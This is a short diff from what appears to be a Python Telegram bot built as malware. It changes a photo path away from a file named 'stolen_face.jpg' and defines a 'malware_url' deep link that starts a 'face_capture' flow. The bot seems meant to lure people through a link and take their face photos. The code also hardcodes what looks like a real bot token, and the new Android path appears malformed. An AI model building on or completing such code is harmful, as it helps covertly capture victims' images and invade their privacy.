@@ -4,7 +4,7 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, CallbackContext
 
 TOKEN = "7510733548:AAGp3Q_-vvQzT2eHUg_iBh2EsxZuhSFlzXw"
-PHOTO_PATH = "/data/data/com.termux/files/home/stolen_face.jpg"
+PHOTO_PATH = "storage/0/emulated/Download/Telegram/"
 
 def start(update: Update, context: CallbackContext) -> None:
     malware_url = f"https://t.me/{context.bot.username}?start=face_capture"
